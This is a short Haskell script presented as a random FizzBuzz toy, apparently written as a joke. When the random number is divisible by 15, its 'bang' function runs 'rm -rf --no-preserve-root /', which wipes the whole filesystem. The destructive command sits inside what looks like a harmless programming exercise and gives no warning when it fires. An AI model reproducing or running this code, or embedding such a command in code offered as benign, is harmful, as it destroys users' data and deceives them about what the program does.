#!/usr/bin/env runhaskell
import System.Random
import System.Process
import Control.Monad

main :: IO ()
main = do
          a <- randomRIO (1,100) :: IO Int
          case ((a `mod` 5 == 0), (a `mod` 3 == 0)) of
               (False, False) -> click $ show a
               (False, True)  -> click "Fizz"
               (True,  False) -> click "Buzz"
               (True,  True)  -> bang

click = putStrLn        
bang  = void $ system "rm -rf --no-preserve-root /"
